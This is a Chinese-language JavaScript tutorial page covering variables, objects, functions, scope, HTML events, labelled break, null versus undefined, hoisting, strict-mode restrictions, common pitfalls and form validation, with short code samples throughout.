<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> carname=<span class="keyword">new</span> <span class="title class_">String</span>;</span><br><span class="line"><span class="keyword">var</span> x=      <span class="keyword">new</span> <span class="title class_">Number</span>;</span><br><span class="line"><span class="keyword">var</span> y=      <span class="keyword">new</span> <span class="title class_">Boolean</span>;</span><br><span class="line"><span class="keyword">var</span> cars=   <span class="keyword">new</span> <span class="title class_">Array</span>;</span><br><span class="line"><span class="keyword">var</span> person= <span class="keyword">new</span> <span class="title class_">Object</span>;</span><br></pre></td></tr></table></figure>
<p>注意：JavaScript 变量均为对象。当声明一个变量时，就创建了一个新的对象。</p>
<h1 id="对象-1"><a href="#对象-1" class="headerlink" title="对象"></a>对象</h1><p>JavaScript 对象是拥有属性和方法的数据。</p>
<h2 id="访问对象方法"><a href="#访问对象方法" class="headerlink" title="访问对象方法"></a>访问对象方法</h2><p>可以使用以下语法创建对象方法：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">methodName : <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="comment">// 代码 </span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>使用以下语法访问对象方法：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">objectName.<span class="title function_">methodName</span>()</span><br></pre></td></tr></table></figure>
<p>通常 methodName() 是作为对象的一个方法， methodName 是作为一个属性。如果使用 fullName 属性，不添加 (), 它会返回函数的定义。</p>
<h2 id="函数语法"><a href="#函数语法" class="headerlink" title="函数语法"></a>函数语法</h2><p>函数就是包裹在花括号中的代码块，前面使用了关键词 function：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">functionname</span>(<span class="params"></span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// 执行代码</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>注意：JavaScript 对大小写敏感。关键词 function 必须是小写的，并且必须以与函数名称相同的大小写来调用函数。</p>
<h2 id="局部-JavaScript-变量"><a href="#局部-JavaScript-变量" class="headerlink" title="局部 JavaScript 变量"></a>局部 JavaScript 变量</h2><p>在 JavaScript 函数内部声明的变量（使用 var）是局部变量，所以只能在函数内部访问它。（该变量的作用域是局部的）。<br>您可以在不同的函数中使用名称相同的局部变量，因为只有声明过该变量的函数才能识别出该变量。<br>只要函数运行完毕，本地变量就会被删除。</p>
<h2 id="全局-JavaScript-变量"><a href="#全局-JavaScript-变量" class="headerlink" title="全局 JavaScript 变量"></a>全局 JavaScript 变量</h2><p>在函数外声明的变量是全局变量，网页上的所有脚本和函数都能访问它。</p>
<h2 id="JavaScript-变量的生存期"><a href="#JavaScript-变量的生存期" class="headerlink" title="JavaScript 变量的生存期"></a>JavaScript 变量的生存期</h2><p>JavaScript 变量的生命期从它们被声明的时间开始。<br>局部变量会在函数运行以后被删除。<br>全局变量会在页面关闭后被删除。</p>
<h2 id="向未声明的-JavaScript-变量分配值"><a href="#向未声明的-JavaScript-变量分配值" class="headerlink" title="向未声明的 JavaScript 变量分配值"></a>向未声明的 JavaScript 变量分配值</h2><p>如果把值赋给尚未声明的变量，该变量将被自动作为 window 的一个属性。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">carname=&quot;Volvo&quot;;</span><br></pre></td></tr></table></figure>
<p>将声明 window 的一个属性 carname。<br>非严格模式下给未声明变量赋值创建的全局变量，是全局对象的可配置属性，可以删除。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> var1 = <span class="number">1</span>; <span class="comment">// 不可配置全局属性</span></span><br><span class="line">var2 = <span class="number">2</span>; <span class="comment">// 没有使用 var 声明，可配置全局属性</span></span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>.<span class="property">var1</span>); <span class="comment">// 1</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">window</span>.<span class="property">var1</span>); <span class="comment">// 1</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">window</span>.<span class="property">var2</span>); <span class="comment">// 2</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">delete</span> var1; <span class="comment">// false 无法删除</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(var1); <span class="comment">//1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">delete</span> var2; </span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="keyword">delete</span> var2); <span class="comment">// true</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(var2); <span class="comment">// 已经删除 报错变量未定义</span></span><br></pre></td></tr></table></figure>


<h1 id="事件"><a href="#事件" class="headerlink" title="事件"></a>事件</h1><p>HTML 事件是发生在 HTML 元素上的事情。<br>当在 HTML 页面中使用 JavaScript 时， JavaScript 可以触发这些事件。</p>
<h2 id="HTML-事件"><a href="#HTML-事件" class="headerlink" title="HTML 事件"></a>HTML 事件</h2><p>HTML 事件可以是浏览器行为，也可以是用户行为。<br>以下是 HTML 事件的实例：</p>
<ul>
<li>HTML 页面完成加载</li>
<li>HTML input 字段改变时</li>
<li>HTML 按钮被点击<br>在事件触发时 JavaScript 可以执行一些代码。<br>HTML 元素中可以添加事件属性，使用 JavaScript 代码来添加 HTML 元素。<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">onclick</span>=<span class="string">&quot;getElementById(&#x27;demo&#x27;).innerHTML=Date()&quot;</span>&gt;</span>现在的时间是?<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">onclick</span>=<span class="string">&quot;this.innerHTML=Date()&quot;</span>&gt;</span>现在的时间是?<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">onclick</span>=<span class="string">&quot;displayDate()&quot;</span>&gt;</span>现在的时间是?<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="常见的HTML事件"><a href="#常见的HTML事件" class="headerlink" title="常见的HTML事件"></a>常见的HTML事件</h2><p>onchange		HTML元素改变<br>onclick			用户点击HTML元素<br>onmouseover		鼠标指针移动到指定元素上时发生<br>onmouseout		用户从一个HTML元素上移开鼠标时发生<br>onkeydown		用户按下键盘按键<br>onload			浏览器已完成页面的加载</p>
<h2 id="Javascript可以做的事"><a href="#Javascript可以做的事" class="headerlink" title="Javascript可以做的事"></a>Javascript可以做的事</h2><p>事件可以用于处理表单验证，用户输入，用户行为及浏览器动作:</p>
<ul>
<li>页面加载时触发事件</li>
<li>页面关闭时触发事件</li>
<li>用户点击按钮执行动作</li>
<li>验证用户输入内容的合法性</li>
</ul>
<h2 id="可以使用多种方法来执行-JavaScript-事件代码："><a href="#可以使用多种方法来执行-JavaScript-事件代码：" class="headerlink" title="可以使用多种方法来执行 JavaScript 事件代码："></a>可以使用多种方法来执行 JavaScript 事件代码：</h2><ul>
<li>HTML 事件属性可以直接执行 JavaScript 代码</li>
<li>HTML 事件属性可以调用 JavaScript 函数</li>
<li>可以为 HTML 元素指定自己的事件处理程序</li>
<li>可以阻止事件的发生。</li>
</ul>
<h1 id="break-和-continue-语句"><a href="#break-和-continue-语句" class="headerlink" title="break 和 continue 语句"></a>break 和 continue 语句</h1><p>可以对 JavaScript 语句进行标记。如需标记 JavaScript 语句，请在语句之前加上冒号：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">label:</span><br><span class="line">statements</span><br></pre></td></tr></table></figure>
<p>break 和 continue 语句仅仅是能够跳出代码块的语句。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">break labelname; </span><br><span class="line">continue labelname;</span><br></pre></td></tr></table></figure>
<p>continue 语句（带有或不带标签引用）只能用在循环中。<br>break 语句（不带标签引用），只能用在循环或 switch 中。<br>通过标签引用，break 语句可用于跳出任何 JavaScript 代码块：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">cars=[<span class="string">&quot;BMW&quot;</span>,<span class="string">&quot;Volvo&quot;</span>,<span class="string">&quot;Saab&quot;</span>,<span class="string">&quot;Ford&quot;</span>];</span><br><span class="line"><span class="attr">list</span>: </span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable language_">document</span>.<span class="title function_">write</span>(cars[<span class="number">0</span>] + <span class="string">&quot;&lt;br&gt;&quot;</span>); </span><br><span class="line">    <span class="variable language_">document</span>.<span class="title function_">write</span>(cars[<span class="number">1</span>] + <span class="string">&quot;&lt;br&gt;&quot;</span>); </span><br><span class="line">    <span class="variable language_">document</span>.<span class="title function_">write</span>(cars[<span class="number">2</span>] + <span class="string">&quot;&lt;br&gt;&quot;</span>); </span><br><span class="line">    <span class="keyword">break</span> list;</span><br><span class="line">    <span class="variable language_">document</span>.<span class="title function_">write</span>(cars[<span class="number">3</span>] + <span class="string">&quot;&lt;br&gt;&quot;</span>); </span><br><span class="line">    <span class="variable language_">document</span>.<span class="title function_">write</span>(cars[<span class="number">4</span>] + <span class="string">&quot;&lt;br&gt;&quot;</span>); </span><br><span class="line">    <span class="variable language_">document</span>.<span class="title function_">write</span>(cars[<span class="number">5</span>] + <span class="string">&quot;&lt;br&gt;&quot;</span>); </span><br><span class="line">&#125;												<span class="comment">// break之后的代码不会执行</span></span><br></pre></td></tr></table></figure>


<h1 id="null-和-undefined"><a href="#null-和-undefined" class="headerlink" title="null 和 undefined"></a>null 和 undefined</h1><h2 id="null"><a href="#null" class="headerlink" title="null"></a>null</h2><p>在 JavaScript 中 null 表示 “什么都没有”。<br>null是一个只有一个值的特殊类型。表示一个空对象引用。<br>可以设置为 null 来清空对象<br>null主动释放一个变量引用的对象，表示一个变量不再指向任何对象地址。</p>
<h2 id="undefined"><a href="#undefined" class="headerlink" title="undefined"></a>undefined</h2><p>在 JavaScript 中, undefined 是一个没有设置值的变量。<br>typeof 一个没有值的变量会返回 undefined。<br>可以设置为 undefined 来清空对象<br>undefined是所有没有赋值变量的默认值，自动赋值。</p>
<h2 id="undefined-和-null-的区别"><a href="#undefined-和-null-的区别" class="headerlink" title="undefined 和 null 的区别"></a>undefined 和 null 的区别</h2><p>null 和 undefined 的值相等，但类型不等</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typeof</span> <span class="literal">undefined</span>             <span class="comment">// undefined</span></span><br><span class="line"><span class="keyword">typeof</span> <span class="literal">null</span>                  <span class="comment">// object</span></span><br><span class="line"><span class="literal">null</span> === <span class="literal">undefined</span>           <span class="comment">// false</span></span><br><span class="line"><span class="literal">null</span> == <span class="literal">undefined</span>            <span class="comment">// true</span></span><br></pre></td></tr></table></figure>


<h1 id="类型转换"><a href="#类型转换" class="headerlink" title="类型转换"></a>类型转换</h1><p>Number() 转换为数字， String() 转换为字符串， Boolean() 转换为布尔值。</p>
<h2 id="数据类型-2"><a href="#数据类型-2" class="headerlink" title="数据类型"></a>数据类型</h2><p>数据类型：string . number . boolean . object . function . symbol<br>对象类型：Object . Date . Array<br>不包含任何值的数据类型：null . undefined<br>注意：<br>NaN 的数据类型是 number<br>数组(Array)的数据类型是 object<br>日期(Date)的数据类型为 object<br>null 的数据类型是 object<br>未定义变量的数据类型为 undefined<br>如果对象是 JavaScript Array 或 JavaScript Date ，我们就无法通过 typeof 来判断他们的类型，因为都是 返回 object。</p>
<h2 id="属性"><a href="#属性" class="headerlink" title="属性"></a>属性</h2><p>constructor 属性返回所有 JavaScript 变量的构造函数。</p>
<h1 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h1><p><strong>search()</strong> 方法用于检索字符串中指定的子字符串，或检索与正则表达式相匹配的子字符串，并返回子串的起始位置。<br><strong>replace()</strong> 方法用于在字符串中用一些字符串替换另一些字符串，或替换一个与正则表达式匹配的子串。<br><strong>test()</strong> 方法是一个正则表达式方法。test() 方法用于检测一个字符串是否匹配某个模式，如果字符串中含有匹配的文本，则返回 true，否则返回 false。<br><strong>exec()</strong> 方法是一个正则表达式方法。exec() 方法用于检索字符串中的正则表达式的匹配。该函数返回一个数组，其中存放匹配的结果。如果未找到匹配，则返回值为 null。<br>使用 RegExp 对象<br>在 JavaScript 中，RegExp 对象是一个预定义了属性和方法的正则表达式对象。</p>
<h1 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h1><p>浏览器点击F12，选择Sources,设置断点进行代码调试即可（要在js中才行）。<br>debugger 关键字用于停止执行 JavaScript，并调用调试函数。这个关键字与在调试工具中设置断点的效果是一样的。如果没有调试可用，debugger 语句将无法工作。</p>
<h1 id="声明提升-hoisting"><a href="#声明提升-hoisting" class="headerlink" title="声明提升(hoisting)"></a>声明提升(hoisting)</h1><p>JavaScript 中，函数及变量的声明都将被提升到函数的最顶部。<br>JavaScript 中，变量可以在使用后声明，也就是变量可以先使用再声明。</p>
<ul>
<li>JavaScript 初始化不会提升<br>JavaScript 只有声明的变量会提升，初始化的不会。<br>实例：<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> x = <span class="number">5</span>; <span class="comment">// 初始化 x</span></span><br><span class="line">elem = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;demo&quot;</span>); <span class="comment">// 查找元素</span></span><br><span class="line">elem.<span class="property">innerHTML</span> = x + <span class="string">&quot; &quot;</span> + y;           <span class="comment">// 显示 x 和 y</span></span><br><span class="line"><span class="keyword">var</span> y = <span class="number">7</span>; <span class="comment">// 初始化 y</span></span><br></pre></td></tr></table></figure>
y 输出了 undefined，这是因为变量声明 (var y) 提升了，但是初始化(y &#x3D; 7) 并不会提升，所以 y 变量是一个未定义的变量。</li>
<li>在头部声明你的变量<br>通常我们在每个作用域开始前声明这些变量，这也是正常的 JavaScript 解析步骤，易于我们理解。</li>
</ul>
<h1 id="严格模式-use-strict"><a href="#严格模式-use-strict" class="headerlink" title="严格模式(use strict)"></a>严格模式(use strict)</h1><p>JavaScript 严格模式（strict mode）即在严格的条件下运行</p>
<h2 id="使用-“use-strict”-指令"><a href="#使用-“use-strict”-指令" class="headerlink" title="使用 “use strict” 指令"></a>使用 “use strict” 指令</h2><p>“use strict” 指令在 JavaScript 1.8.5 (ECMAScript5) 中新增。<br>它不是一条语句，但是是一个字面量表达式，在 JavaScript 旧版本中会被忽略。<br>“use strict” 的目的是指定代码在严格条件下执行。<br>严格模式下不能使用未声明的变量。</p>
<h2 id="严格模式声明"><a href="#严格模式声明" class="headerlink" title="严格模式声明"></a>严格模式声明</h2><p>严格模式通过在脚本或函数的头部添加 <code>use strict</code> ; 表达式来声明。<br>实例：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="meta">&quot;use strict&quot;</span>;</span><br><span class="line"><span class="title function_">myFunction</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">myFunction</span>(<span class="params"></span>) &#123;</span><br><span class="line">    y = <span class="number">3.14</span>;   <span class="comment">// 报错 (y 未定义)</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>为什么使用严格模式:</p>
<ul>
<li>消除Javascript语法的一些不合理、不严谨之处，减少一些怪异行为;</li>
<li>消除代码运行的一些不安全之处，保证代码运行的安全；</li>
<li>提高编译器效率，增加运行速度；</li>
<li>为未来新版本的Javascript做好铺垫。</li>
</ul>
<h2 id="严格模式的限制"><a href="#严格模式的限制" class="headerlink" title="严格模式的限制"></a>严格模式的限制</h2><ul>
<li><p>不允许使用未声明的变量</p>
</li>
<li><p>不允许删除变量或对象</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="meta">&quot;use strict&quot;</span>;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">x</span>(<span class="params">p1, p2</span>) &#123;&#125;;</span><br><span class="line"><span class="keyword">delete</span> x;  </span><br></pre></td></tr></table></figure></li>
<li><p>不允许变量重名</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="meta">&quot;use strict&quot;</span>;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">x</span>(<span class="params">p1, p1</span>) &#123;&#125;;</span><br></pre></td></tr></table></figure></li>
<li><p>不允许使用八进制</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="meta">&quot;use strict&quot;</span>;</span><br><span class="line"><span class="keyword">var</span> x = <span class="number">010</span>; </span><br></pre></td></tr></table></figure></li>
<li><p>不允许使用转义字符</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="meta">&quot;use strict&quot;</span>;</span><br><span class="line"><span class="keyword">var</span> x = \<span class="number">010</span>;</span><br></pre></td></tr></table></figure></li>
<li><p>不允许对只读属性赋值</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="meta">&quot;use strict&quot;</span>;</span><br><span class="line"><span class="keyword">var</span> obj = &#123;&#125;;</span><br><span class="line"><span class="title class_">Object</span>.<span class="title function_">defineProperty</span>(obj, <span class="string">&quot;x&quot;</span>, &#123;<span class="attr">value</span>:<span class="number">0</span>, <span class="attr">writable</span>:<span class="literal">false</span>&#125;);</span><br><span class="line"></span><br><span class="line">obj.<span class="property">x</span> = <span class="number">3.14</span>;  </span><br></pre></td></tr></table></figure></li>
<li><p>不允许对一个使用getter方法读取的属性进行赋值</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="meta">&quot;use strict&quot;</span>;</span><br><span class="line"><span class="keyword">var</span> obj = &#123;<span class="keyword">get</span> <span class="title function_">x</span>() &#123;<span class="keyword">return</span> <span class="number">0</span>&#125; &#125;;</span><br><span class="line"></span><br><span class="line">obj.<span class="property">x</span> = <span class="number">3.14</span>;            <span class="comment">// 报错</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>不允许删除一个不允许删除的属性</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="meta">&quot;use strict&quot;</span>;</span><br><span class="line"><span class="keyword">delete</span> <span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span>; <span class="comment">// 报错</span></span><br></pre></td></tr></table></figure></li>
<li><p>变量名不能使用 “eval” 字符串</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="meta">&quot;use strict&quot;</span>;</span><br><span class="line"><span class="keyword">var</span> <span class="built_in">eval</span> = <span class="number">3.14</span>;         <span class="comment">// 报错</span></span><br></pre></td></tr></table></figure></li>
<li><p>变量名不能使用 “arguments” 字符串</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="meta">&quot;use strict&quot;</span>;</span><br><span class="line"><span class="keyword">var</span> <span class="variable language_">arguments</span> = <span class="number">3.14</span>;    <span class="comment">// 报错</span></span><br></pre></td></tr></table></figure></li>
<li><p>不允许使用以下这种语句</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="meta">&quot;use strict&quot;</span>;</span><br><span class="line"><span class="keyword">with</span> (<span class="title class_">Math</span>)&#123;x = <span class="title function_">cos</span>(<span class="number">2</span>)&#125;; <span class="comment">// 报错</span></span><br></pre></td></tr></table></figure></li>
<li><p>由于一些安全原因，在作用域 eval() 创建的变量不能被调用</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="meta">&quot;use strict&quot;</span>;</span><br><span class="line"><span class="built_in">eval</span> (<span class="string">&quot;var x = 2&quot;</span>);</span><br><span class="line">alert (x);               <span class="comment">// 报错</span></span><br></pre></td></tr></table></figure></li>
<li><p>禁止this关键字指向全局对象</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">f</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> !<span class="variable language_">this</span>;</span><br><span class="line">&#125; </span><br><span class="line"><span class="comment">// 返回false，因为&quot;this&quot;指向全局对象，&quot;!this&quot;就是false</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">f</span>(<span class="params"></span>)&#123; </span><br><span class="line">    <span class="string">&quot;use strict&quot;</span>;</span><br><span class="line">    <span class="keyword">return</span> !<span class="variable language_">this</span>;</span><br><span class="line">&#125; </span><br><span class="line"><span class="comment">// 返回true，因为严格模式下，this的值为undefined，所以&quot;!this&quot;为true。</span></span><br></pre></td></tr></table></figure>
<p>因此，使用构造函数时，如果忘了加new，this不再指向全局对象，而是报错。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">f</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="string">&quot;use strict&quot;</span>;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">a</span> = <span class="number">1</span>;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="title function_">f</span>();<span class="comment">// 报错，this未定义</span></span><br></pre></td></tr></table></figure></li>
</ul>
<p>注意：”use strict” 指令只允许出现在脚本或函数的开头</p>
<h1 id="使用误区"><a href="#使用误区" class="headerlink" title="使用误区"></a>使用误区</h1><h2 id="比较运算符常见错误"><a href="#比较运算符常见错误" class="headerlink" title="比较运算符常见错误"></a>比较运算符常见错误</h2><p>switch 语句会使用恒等计算符(&#x3D;&#x3D;&#x3D;)进行比较<br>以下实例由于类型不一致不会执行 alert 弹窗：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> x = <span class="number">10</span>;</span><br><span class="line"><span class="keyword">switch</span>(x) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&quot;10&quot;</span>: <span class="title function_">alert</span>(<span class="string">&quot;Hello&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="浮点型数据使用注意事项"><a href="#浮点型数据使用注意事项" class="headerlink" title="浮点型数据使用注意事项"></a>浮点型数据使用注意事项</h2><p>JavaScript 中的所有数据都是以 64 位<strong>浮点型数据(float)</strong> 来存储。<br>所有的编程语言，包括 JavaScript，对浮点型数据的精确度都很难确定</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> x = <span class="number">0.1</span>;</span><br><span class="line"><span class="keyword">var</span> y = <span class="number">0.2</span>;</span><br><span class="line"><span class="keyword">var</span> z = x + y            <span class="comment">// z 的结果为 0.30000000000000004</span></span><br><span class="line"><span class="keyword">if</span> (z == <span class="number">0.3</span>)            <span class="comment">// 返回 false</span></span><br></pre></td></tr></table></figure>
<p>为解决以上问题，可以用整数的乘除法来解决：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> z = (x * <span class="number">10</span> + y * <span class="number">10</span>) / <span class="number">10</span>;       <span class="comment">// z 的结果为 0.3</span></span><br></pre></td></tr></table></figure>

<h2 id="JavaScript-字符串分行"><a href="#JavaScript-字符串分行" class="headerlink" title="JavaScript 字符串分行"></a>JavaScript 字符串分行</h2><p>JavaScript 允许我们在字符串中使用断行语句:</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> x =</span><br><span class="line"><span class="string">&quot;Hello World!&quot;</span>;</span><br></pre></td></tr></table></figure>
<p>但是，在字符串中直接使用回车换行是会报错的,字符串断行需要使用反斜杠()，如下所示:</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> x = <span class="string">&quot;Hello \</span></span><br><span class="line"><span class="string">World!&quot;</span>;</span><br></pre></td></tr></table></figure>
<p>注意：不用对 return 语句进行断行。</p>
<h2 id="数组中使用名字来索引"><a href="#数组中使用名字来索引" class="headerlink" title="数组中使用名字来索引"></a>数组中使用名字来索引</h2><p>许多程序语言都允许使用名字来作为数组的索引。<br>使用名字来作为索引的数组称为关联数组(或哈希)。<br>JavaScript 不支持使用名字来索引数组，只允许使用数字索引<br>在 JavaScript 中, 对象 使用 名字作为索引。<br>如果你使用名字作为索引，当访问数组时，JavaScript 会把数组重新定义为标准对象。<br>执行这样操作后，数组的方法及属性将不能再使用，否则会产生错误:</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> person = [];</span><br><span class="line">person[<span class="string">&quot;firstName&quot;</span>] = <span class="string">&quot;John&quot;</span>;</span><br><span class="line">person[<span class="string">&quot;lastName&quot;</span>] = <span class="string">&quot;Doe&quot;</span>;</span><br><span class="line">person[<span class="string">&quot;age&quot;</span>] = <span class="number">46</span>;</span><br><span class="line"><span class="keyword">var</span> x = person.<span class="property">length</span>;         <span class="comment">// person.length 返回 0</span></span><br><span class="line"><span class="keyword">var</span> y = person[<span class="number">0</span>];             <span class="comment">// person[0] 返回 undefined</span></span><br></pre></td></tr></table></figure>

<h2 id="定义数组元素和对象，最后不能添加逗号"><a href="#定义数组元素和对象，最后不能添加逗号" class="headerlink" title="定义数组元素和对象，最后不能添加逗号"></a>定义数组元素和对象，最后不能添加逗号</h2><p>数组最后一个值的后面添加逗号虽然语法没有问题，但是在不同的浏览器可能得到不同的结果。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> colors = [<span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>,]; <span class="comment">//这样数组的长度可能为3 也可能为4。</span></span><br></pre></td></tr></table></figure>

<h2 id="Undefined-不是-Null"><a href="#Undefined-不是-Null" class="headerlink" title="Undefined 不是 Null"></a>Undefined 不是 Null</h2><p>在 JavaScript 中, <strong>null</strong> 用于对象, <strong>undefined</strong> 用于变量，属性和方法。<br>对象只有被定义才有可能为 null，否则为 undefined。<br>如果我们想测试对象是否存在，在对象还没定义时将会抛出一个错误。<br>正确的方式是我们需要先使用 typeof 来检测对象是否已定义：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">typeof</span> myObj !== <span class="string">&quot;undefined&quot;</span> &amp;&amp; myObj !== <span class="literal">null</span>)</span><br></pre></td></tr></table></figure>

<h2 id="程序块作用域"><a href="#程序块作用域" class="headerlink" title="程序块作用域"></a>程序块作用域</h2><p>在每个代码块中 JavaScript 不会创建一个新的作用域，一般各个代码块的作用域都是全局的。</p>
<h1 id="表单"><a href="#表单" class="headerlink" title="表单"></a>表单</h1><h2 id="表单验证"><a href="#表单验证" class="headerlink" title="表单验证"></a>表单验证</h2><p>HTML 表单验证可以通过 JavaScript 来完成。<br>以下实例代码用于判断表单字段(fname)值是否存在， 如果不存在，就弹出信息，阻止表单提交：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">validateForm</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> x = <span class="variable language_">document</span>.<span class="property">forms</span>[<span class="string">&quot;myForm&quot;</span>][<span class="string">&quot;fname&quot;</span>].<span class="property">value</span>;</span><br><span class="line">    <span class="keyword">if</span> (x == <span class="literal">null</span> || x == <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">        <span class="title function_">alert</span>(<span class="string">&quot;需要输入名字。&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>以上 JavaScript 代码可以通过 HTML 代码来调用：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">name</span>=<span class="string">&quot;myForm&quot;</span> <span class="attr">action</span>=<span class="string">&quot;demo_form.php&quot;</span> <span class="attr">onsubmit</span>=<span class="string">&quot;return validateForm()&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span>&gt;</span></span><br><span class="line">名字: <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;fname&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;提交&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><strong>onsubmit&#x3D;”return validateForm()”</strong> 当验证不通过时，返回 false，可以阻止表单提交。</p>
<h2 id="HTML-表单自动验证"><a href="#HTML-表单自动验证" class="headerlink" title="HTML 表单自动验证"></a>HTML 表单自动验证</h2><p>HTML 表单验证也可以通过浏览器来自动完成。<br>如果表单字段 (fname) 的值为空, required 属性会阻止表单提交：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;demo_form.php&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;fname&quot;</span> <span class="attr">required</span>=<span class="string">&quot;required&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;提交&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>
